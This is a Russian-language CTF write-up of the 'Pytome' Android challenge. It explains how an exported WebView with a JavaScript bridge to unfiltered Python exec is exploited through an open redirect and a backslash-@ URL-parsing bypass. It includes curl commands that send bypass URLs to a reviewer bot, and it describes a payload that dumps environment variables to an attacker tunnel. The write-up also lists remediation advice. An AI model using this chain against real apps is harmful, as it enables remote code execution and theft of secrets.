# Pytome — райтап

**Флаг:** `avito{pYThON_In_WEbv13w_1s_D4NGEroUs}`
**Класс:** Android / mobile (exported WebView + JS bridge + weak host-allowlist) ·
**Сложность:** н/д · **Очки:** н/д · **Решило команд:** н/д
**Автор:** н/д (метаданные платформы по этой задаче не сохранены)

**Суть решения в одном абзаце.** Приложение встраивает настоящий CPython через Chaquopy и
исполняет любой Python, который ему пришлют через JS-мост `AndroidBridge.eval` в exported
`WebView`-активити; проверка допустимого хоста смотрит только на **стартовый** URL, а не на
навигацию, поэтому открытый редирект и `\@`-дифференциал парсинга URL на доверенном домене
уводят мост на наш сервер. Бот-ревизор открывает присланную ссылку внутри приложения (где `FLAG`
уже лежит в `os.environ`), наш JS дампит окружение через мост и сливает его нам.

---

## 1. Задача

Мобильное приложение-«обучалка Python» (Pytome) исполняет код прямо на телефоне. **Цель:** слить
переменную окружения `FLAG` из приложения.

**Дано:** `pytome.apk` (~60 МБ). Бэкенда в APK нет, но он есть на `https://pytome-57ymra6o.avitoctf.ru`.

## 2. Разведка

Это не «одна дырка», а цепочка из нескольких звеньев.

**1) APK на 60 МБ — подозрительно много.** Распаковка (`unzip pytome.apk -d extracted/`) показывает:
- `extracted/lib/{arm64-v8a,x86_64,...}/libpython3.11.so`, `libchaquopy_java.so`, `libssl_python.so`;
- каталог `extracted/assets/chaquopy/` (`bootstrap.imy`, `stdlib-*.imy`, `app.imy`, `requirements-*.imy`).

Вывод: это **Chaquopy** — фреймворк, встраивающий настоящий **CPython 3.11** в Android-приложение.
Значит приложение реально исполняет Python **на телефоне**, локально.

**2) Манифест.** `extracted/AndroidManifest.xml` (бинарный AXML, строки в UTF-16). Видно: пакет
`ru.avitoctf.pytome`; активити `MainActivity`, `DocsActivity`, класс приложения
`PytomeApplication`; **`usesCleartextTraffic`** включён; разрешения `INTERNET` и `DUMP`; deep link
`action.VIEW` + `category.BROWSABLE`/`DEFAULT`, схема `pytome`, host `docs` → `pytome://docs`; обе
активити **`exported`**.

## 3. Как мы вышли на решение (логика гипотез)

- **Наблюдение.** Задача называет себя «обучалка Python с защитой от пчёл-вайбкодеров» — значит
  ожидается какой-то фильтр опасного кода.
  **Гипотеза** — если фильтра нет, любой присланный Python выполнится без ограничений.
  **Проверка** — декомпиляция `classes.dex` (jadx), класс `PythonEngine.execute(code)`: буквально
  `builtins.exec(code, ...)`, результат — то, что напечаталось (через `redirect_stdout`).
  **Подтверждено**: никаких проверок `import`/`os`/`environ` нет — «защита» фейковая.
  `import os; print(os.environ['FLAG'])` сработает в лоб, **если** удастся довести свой код до этого
  `execute()`.

- **Наблюдение.** `MainActivity.onCreate` берёт `getIntent().getStringExtra("FLAG")` и кладёт в
  `os.environ["FLAG"]`.
  **Вывод** — флаг задаётся **при запуске приложения на устройстве ревизора** через Intent-extra,
  в самом APK его нет. Значит нужен **рантайм-лик через живой инстанс приложения**, а не статический
  анализ файла.

- **Наблюдение.** Кто вызывает `execute()`? — `DocsActivity`: там `WebView` с
  `setJavaScriptEnabled(true)` и `addJavascriptInterface(new PythonBridge(), "AndroidBridge")`, где
  `@JavascriptInterface eval(code)` → `PythonEngine.execute(code)`.
  **Гипотеза** — любой JavaScript, исполненный в этом `WebView`, может вызвать `AndroidBridge.eval`
  и тем самым выполнить произвольный Python. Осталось подсунуть в этот `WebView` свою страницу.

- **Наблюдение.** `DocsActivity` (exported, deep link `pytome://docs?url=...`) проверяет, что host
  **стартового** URL равен `pytome-57ymra6o.avitoctf.ru`.
  **Гипотеза** — проверка стартового URL ничего не говорит о том, что происходит **после**
  навигации (редиректы, смена хоста). Если клиент `WebView` — дефолтный `WebViewClient()` без
  переопределения `shouldOverrideUrlLoading`, то навигация не валидируется, и JS-мост должен
  сохраниться после редиректа на чужой хост.
  **Проверка** — поиск в декомпиляции переопределения `shouldOverrideUrlLoading` в `DocsActivity`:
  не найдено, используется дефолтный клиент. Гипотеза подтверждена архитектурно.

- **Как обойти host-check на практике — два способа, оба проверены:**
  - **Открытый редирект** на доверенном хосте: `GET /go?to=<любой URL>` отдаёт 302 куда угодно —
    найден просмотром бэкенд-роутов;
  - **Дифференциал парсинга URL через `\@`**: в `https://<ATTACKER>\@pytome-57ymra6o.avitoctf.ru/x`
    серверная проверка (парсер бэкенда) и `WebView` (парсер Chromium) расходятся в том, что считать
    host'ом. В логе сервера это видно как загруженный путь `/@pytome-.../x` — то есть бэкенд-проверка
    видит один хост, а браузерный движок — другой.
    **Из этого следствие для эксплойт-сервера**: раз путь запроса непредсказуем
    (`/@pytome-.../x` вместо ожидаемого `/x`), сервер-ловушку нужно делать **catch-all** — отвечать
    payload'ом на любой путь, а не ждать конкретный.

- **Как доставить это боту.** На бэкенде есть форма `/docs/bug-report` — «пришли ссылку
  ревизору». **Гипотеза** — бот автоматически открывает присланный URL в уязвимом приложении, где
  `FLAG` уже в окружении. Это замыкает цепочку: доставка → навигация обходит host-check → мост жив →
  произвольный Python → exfil.

## 4. Уязвимость

Опасна связка **exported WebView-активити + JS-мост, исполняющий произвольный код + слабый
host-allowlist**:

- `addJavascriptInterface(PythonBridge, "AndroidBridge")` + `setJavaScriptEnabled(true)` даёт JS
  прямой доступ к `PythonEngine.execute` → произвольный Python в контексте приложения;
- `PythonEngine.execute` — голый `exec()` без всякой фильтрации;
- allowlist проверяет только **стартовый** URL, а дефолтный `WebViewClient` не валидирует
  навигацию → мост живёт после редиректа/смены хоста;
- на доверенном домене есть **open-redirect** `/go?to=` и работает **`\@`-дифференциал** — оба
  обнуляют host-проверку;
- доставку на устройство с секретом делает **бот-ревизор** через `/docs/bug-report`.

Итог цепочки: `pytome://docs?url=…` (или форма бота) → host-check обходится open-redirect'ом /
`\@` → WebView грузит нашу страницу с живым `AndroidBridge` → произвольный Python →
`os.environ['FLAG']` → exfil.

## 5. Эксплойт по шагам

Нужны: любой компьютер, Python 3 и способ показать боту страницу по HTTPS. В репозитории лежит
готовый `task7/exploit_server.py`.

### Шаг 1. Что делает `exploit_server.py`

Catch-all трап-сервер: на **любой** путь он отдаёт страницу-пейлоад, а служебные `/probe`,
`/exfil`, `/diag` логирует. Пейлоад:

- выполняет через мост `import os, json; print(json.dumps(dict(os.environ)))` — дампит всё
  окружение (`FLAG` внутри);
- не знает заранее имя моста, поэтому **перебирает кандидатов**: объекты
  `AndroidBridge, Android, Bridge, PythonBridge, Pytome, ...` и методы
  `eval, exec, execute, run, runPython, ...`; если мост есть — вызывает первый рабочий и шлёт
  результат на `/exfil`;
- если моста нет (обычный браузер) — шлёт диагностику на `/diag` со списком доступных объектов;
- exfil дублируется тремя каналами: `XMLHttpRequest`, `navigator.sendBeacon`, `new Image().src`;
- сервер функцией `find_flag` вырезает подстроку `avito{...}` и печатает `[FLAG] ...`.

```bash
python3 task7/exploit_server.py        # слушает http://127.0.0.1:8000
```

### Шаг 2. Туннель наружу (HTTPS)

```bash
cloudflared tunnel --url http://localhost:8000
# -> https://<random>.trycloudflare.com  (это «наш хост»)
```

### Шаг 3. Собираем URL, обходящий host-check

```
# (а) через открытый редирект доверенного хоста:
https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x

# (б) через \@-дифференциал парсинга URL:
https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x
```

Доставить можно как **deep link** `pytome://docs?url=<внутренний_url>` (бот открывает его в
приложении) или напрямую через форму бота.

### Шаг 4. Отправляем ссылку боту-ревизору

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'name=medoedik' \
  --data-urlencode 'email=medoedik@avito.ru' \
  --data-urlencode 'url=https://<random>.trycloudflare.com\@pytome-57ymra6o.avitoctf.ru/x' \
  --data-urlencode 'bug_type=other' \
  --data-urlencode 'description=review'
```

Вариант через открытый редирект (`/go?to=`):

```bash
curl -s https://pytome-57ymra6o.avitoctf.ru/docs/bug-report \
  --data-urlencode 'url=https://pytome-57ymra6o.avitoctf.ru/go?to=https://<random>.trycloudflare.com/x'
```

Ответ — «ЗАЯВКА #…, ожидаем ревизора». Rate-limit ~1 заявка в минуту.

### Шаг 5. Ловим флаг

```
[serve] path='/@pytome-...'   | БОТ(Android)
==================================================================
[FLAG] avito{pYThON_In_WEbv13w_1s_D4NGEroUs}   | БОТ(Android)
[full] {"FLAG":"avito{pYThON_In_WEbv13w_1s_D4NGEroUs}", ...}
==================================================================
```

Если за пару минут пусто — проверить, что туннель живой и адрес вставлен верно, что заявка прошла
(не словлен rate-limit); можно отправить повторно. Признак «мост не нашёлся» — строка
`[diag] ... NO_BRIDGE` (значит страницу открыл не бот, а обычный браузер).

## 6. Флаг

Флаг **не зашит в APK** — он кладётся в окружение приложения на устройстве бота-ревизора и
достаётся рантайм-ликом через бота: значение появляется на своём сервере после запуска эксплойта.

```
avito{pYThON_In_WEbv13w_1s_D4NGEroUs}
```

## 7. Выводы

1. **Опасна связка `addJavascriptInterface` + `setJavaScriptEnabled(true)` на exported-активити с
   deep link**, где мост исполняет произвольный код, а «allowlist» проверяет только **стартовый**
   URL, а не каждую навигацию.
2. **Открытый редирект** на доверенном домене и **дифференциал парсинга URL** (`\@`) обнуляют
   host-проверку — поэтому эксплойт-сервер и сделан catch-all (путь запроса непредсказуем заранее).
3. **Как надо было:** не вешать нативные мосты на недоверенный контент; валидировать КАЖДУЮ
   навигацию в `WebViewClient.shouldOverrideUrlLoading`; не экспортировать активити с мостом; убрать
   open-redirect; не исполнять пользовательский Python голым `exec`.
4. **Практический приём при решении:** не полагаться на одно имя моста и одну переменную — пейлоад
   **перебирает** имена объектов/методов и **дампит всё окружение**, а exfil дублируется тремя
   каналами; это резко повышает шанс с одной попытки (учитывая rate-limit бота).

## 8. Артефакты

- `task7/exploit_server.py` — curated-скрипт: catch-all HTTP-сервер-ловушка, отдаёт пейлоад на
  любой путь, перебирает имена JS-моста/методов, дампит `os.environ` через `AndroidBridge.eval` и
  логирует найденный `avito{...}`. ruff+ty чисто.
- Пути в декомпиляции (`task7/extracted/`, из `unzip pytome.apk`):
  - `classes.dex` (декомпилировать jadx'ом), классы `ru.avitoctf.pytome`: `PythonEngine` —
    `execute()` (голый `exec`, без фильтра) и `setEnv()` (кладёт FLAG в `os.environ`);
    `MainActivity` — чтение Intent-extra `FLAG` в `onCreate`; `DocsActivity` — `WebView` +
    `addJavascriptInterface(..., "AndroidBridge")`, `@JavascriptInterface eval`, слабая
    host-проверка стартового URL;
  - `AndroidManifest.xml` — обе Activity `exported`, deep link `pytome://docs`,
    `usesCleartextTraffic`, разрешения INTERNET/DUMP;
  - `assets/chaquopy/` и `lib/*/libpython3.11.so` — доказательство встроенного CPython.
- Бэкенд-поверхность: `/docs/*` (страницы дёргают `AndroidBridge.eval`), `/go?to=` (open redirect),
  `/docs/bug-report` (форма к боту-ревизору).
